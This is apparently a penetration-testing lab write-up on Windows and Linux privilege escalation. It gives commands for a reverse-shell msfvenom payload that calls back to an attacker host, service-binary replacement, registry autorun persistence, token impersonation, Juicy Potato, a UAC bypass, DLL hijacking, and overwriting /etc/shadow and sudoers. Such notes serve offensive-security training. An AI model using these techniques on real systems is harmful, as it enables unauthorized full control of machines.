---

# **Privilege Escalation Techniques - Windows & Linux**

---

## **1. Privilege Escalation with PowerUp**

With a Meterpreter session on a Windows target, we imported PowerUp.ps1 and ran `Invoke-AllChecks`. PowerUp identified misconfigurations, allowing us to escalate privileges. Two key methods demonstrated:

* **HTA Exploit**: Hosted an HTA payload via `msfvenom` and `web_delivery`, executed it on the victim system, resulting in a Meterpreter session with admin rights.
* **PsExec**: Used Metasploit's `exploit/windows/smb/psexec` with stolen admin credentials to gain a privileged Meterpreter session.

---

## **2. Privilege Escalation with PrivescCheck**

We used [PrivescCheck](https://github.com/itm4n/PrivescCheck) to scan the system. The report revealed plaintext credentials stored in the **WinLogon registry key**. After extracting credentials, we used `runas.exe` and `psexec` for privilege escalation.

---

## **3. Unattended Installation File**

Identified `Unattend.xml` via PowerUp. Extracted the base64-encoded password and decoded it:

```bash
echo "QWRtaW5AMTIz" | base64 -d
```

Result: `Admin@123`

Used `runas.exe` to escalate privileges:

```powershell
runas.exe /user:administrator cmd
```

Also reused credentials with `psexec` in Metasploit to gain privileged shell access.

---

## **4. Windows Credential Manager**

Used:

```cmd
cmdkey /list
```

No credentials were listed, but escalation was still possible with:

```powershell
runas.exe /savecred /user:administrator cmd
```

Also demonstrated creating a reverse shell payload via `msfvenom` and using PowerShell Web Delivery to open a Meterpreter session.

---

## **5. PowerShell History**

Inspected:

```
C:\Users\student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

Discovered previously entered PowerShell commands, including potential credentials and scripts that assisted in lateral movement or escalation.

---

## **6. Exploiting Insecure Service Permissions**

PowerUp identified that `FileZilla Server.exe` was writable by the student user. Replaced the binary with a malicious payload using:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe > "FileZilla Server.exe"
```

Downloaded and replaced the service binary. Upon restarting the service, a SYSTEM Meterpreter session was received.

---

## **7. Registry AutoRuns Privilege Escalation**

Found writable registry key at:

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Created an AutoRun key pointing to a Meterpreter payload:

```powershell
New-ItemProperty -Path "HKLM:\...\Run" -Name "hacker" -Value "C:\Users\student\Desktop\tool\program.exe"
```

Upon logout and login, the payload executed with elevated privileges.

---

## **8. Access Token Impersonation**

Used `incognito` in Meterpreter:

```powershell
load incognito
list_tokens -u
impersonate_token DOMAIN\Admin
getuid
```

Successfully impersonated a privileged token and operated with elevated access.

---

## **9. Juicy Potato Exploit (SeImpersonatePrivilege)**

Confirmed token privileges:

```powershell
whoami /priv
```

Uploaded `JuicyPotato.exe` and a reverse shell payload. Executed:

```cmd
JuicyPotato.exe -l 4444 -p C:\Users\Public\backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

Resulted in SYSTEM-level shell.

---

## **10. Bypassing UAC with UACMe**

Uploaded `akagi64.exe` (UACMe), identified method 62 (`fodhelper.exe`) for bypass:

```cmd
akagi64.exe 62 C:\Users\Public\payload.exe
```

Executed payload with auto-elevated privileges, bypassing UAC prompts.

---

## **11. DLL Hijacking**

Using Process Monitor, identified missing DLLs. Created a malicious DLL with:

```bash
x86_64-w64-mingw32-gcc -shared -o example.dll malicious.c
```

Placed DLL in the application's directory. When the app was launched, our DLL was loaded, executing the payload with elevated privileges.

---

# **Linux Privilege Escalation Techniques**

## **1. Locally Stored Credentials**

Searched config files in `/var/www/html`:

```bash
grep -nr "db_user" .
```

Found credentials in `database.inc.php`, then switched to root with:

```bash
su
```

---

## **2. Misconfigured File Permissions**

Checked for world-writable files:

```bash
find / -not -type l -perm -o+w
```

Found `/etc/shadow` writable. Generated password:

```bash
openssl passwd -1 -salt abc password
```

Modified `/etc/shadow` to include this hash for root. Logged in as root via `su`.

---

## **3. Exploiting SUID Binaries**

Identified `vim.tiny` with SUID:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

Used `vim.tiny` to edit `/etc/sudoers`, granting the student user passwordless sudo access.

---

# Summary

These techniques demonstrate a wide range of **Windows and Linux privilege escalation** methods, including:

* Misconfigurations (e.g., writable services, registry, shadow files)
* Exploitation of features (e.g., SeImpersonate, SUID)
* Token impersonation and UAC bypasses
* Analysis tools: PowerUp, PrivescCheck, Autoruns, ProcMon
* Custom payloads using `msfvenom` and Metasploit

These techniques are essential for internal network pivoting, post-exploitation access, and realistic red team operations.

---
